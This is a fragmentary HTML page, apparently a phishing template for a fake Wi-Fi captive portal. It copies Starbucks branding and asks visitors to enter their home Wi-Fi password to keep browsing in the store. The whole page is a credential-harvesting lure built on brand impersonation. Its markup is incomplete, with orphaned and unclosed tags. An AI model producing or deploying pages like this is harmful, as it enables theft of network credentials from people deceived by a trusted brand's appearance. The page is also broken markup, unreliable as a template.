<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'SoDoSans','Helvetica Neue',Arial,sans-serif;
background:#f9f6f1;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
.wrapper{width:100%;max-width:380px}
.logo-area{text-align:center;margin-bottom:28px}
.sbux-icon{display:inline-block;width:72px;height:72px;background:#00704A;border-radius:50%;
border:3px solid #1e3932;display:flex;align-items:center;justify-content:center;margin:0 auto 12px}
.sbux-text{color:#1e3932;font-size:1.6em;font-weight:700;letter-spacing:-.5px}
.sbux-sub{color:#1e3932;font-size:.8em;font-weight:400;letter-spacing:2px;text-transform:uppercase;opacity:.7}
.card{background:#fff;border-radius:4px;box-shadow:0 2px 20px rgba(0,0,0,.08);padding:28px 24px}
.card h2{color:#1e3932;font-size:1.05em;font-weight:700;margin-bottom:8px}
.card p{color:#666;font-size:.83em;margin-bottom:20px;line-height:1.5}
.field{margin-bottom:16px}
label{display:block;font-size:.8em;color:#555;margin-bottom:5px;font-weight:700;text-transform:uppercase;letter-spacing:.5px}
input[type=password]{width:100%;padding:10px 12px;border:1px solid #d4d0cb;border-radius:4px;
font-size:.93em;outline:none;transition:border .2s}
input[type=password]:focus{border-color:#00704A;box-shadow:0 0 0 2px rgba(0,112,74,.12)}
button{width:100%;background:#00704A;color:#fff;border:none;border-radius:50px;
padding:13px;font-size:.93em;font-weight:700;cursor:pointer;transition:background .2s;letter-spacing:.3px}
button:hover{background:#1e3932}
.foot-text{text-align:center;font-size:.7em;color:#999;margin-top:16px;line-height:1.5}
</style>

      </svg>
    </div>
    <div class="sbux-text">Starbucks</div>
    <div class="sbux-sub" data-i18n="logo_sub">Wi-Fi</div>
  </div>

    <p data-i18n="sub">Welcome! Enter your home Wi-Fi password to continue browsing while in our store.</p>

      <div class="field">
        <label for="password" data-i18n="lbl_pass">Wi-Fi Password</label>
        <input type="password" id="password" name="password"

    </form>

</div>
